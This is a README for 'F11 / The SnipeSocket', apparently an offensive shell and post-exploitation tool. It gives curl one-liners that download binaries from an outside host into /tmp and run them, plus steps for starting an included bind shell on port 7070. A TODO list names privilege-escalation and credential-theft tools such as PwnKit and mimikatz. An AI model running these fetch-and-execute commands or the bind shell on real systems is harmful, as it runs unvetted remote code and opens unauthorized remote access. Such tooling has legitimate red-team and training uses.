# F11
*The SnipeSocket*


### Install via NPM

```bash
npm i -g f11
f11
```

### Standalone hosted (compressed) binaries
- [f11-linux.xz](https://f11snipe.sh/f11-linux.xz)
- [f11-macos.xz](https://f11snipe.sh/f11-macos.xz)
- [f11-win.exe.xz](https://f11snipe.sh/f11-win.exe.xz)


### One-liner (linux)

```bash
rm /tmp/f11-linux; curl -sL https://f11snipe.sh/f11-linux.xz -o /tmp/f11-linux.xz && xz -d /tmp/f11-linux.xz && chmod +x /tmp/f11-linux && /tmp/f11-linux
```

### One-liner (osx)

```bash
rm /tmp/f11-macos; curl -sL https://f11snipe.sh/f11-macos.xz -o /tmp/f11-macos.xz && xz -d /tmp/f11-macos.xz && chmod +x /tmp/f11-macos && /tmp/f11-macos
```


### One-liner (windows)

```bash
rm /tmp/f11-win.exe; curl -sL https://f11snipe.sh/f11-win.exe.xz -o /tmp/f11-win.exe.xz && xz -d /tmp/f11-win.exe.xz && chmod +x /tmp/f11-win.exe && /tmp/f11-win.exe
```

### Run included standalone bind shell

```bash
# Extract archive
xz -d f11-bind.xz

# Allow execute
chmod +x f11-bind

# Run rev bind shell (port 7070)
./f11-bind
```

### Build from source

```bash
# Run all build steps
npm install
npm run ci
```


#### Individual build steps
```bash
# Install npm packages
npm install

# Build TypeScript
npm build

# Compile
npm run compile

# Compress
npm run compress
```

### TODO - Modules to support

- linpeas (other peas?)
  - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- pwnkit
  - https://github.com/ly4k/PwnKit
- mimikatz (windows)
  - https://github.com/ParrotSec/mimikatz
- SUID/SUDO/CAP/
  - https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid


### Other modules?
- https://github.com/mzet-/linux-exploit-suggester
- https://github.com/diego-treitos/linux-smart-enumeration
- https://github.com/linted/linuxprivchecker
- custom?
  - https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
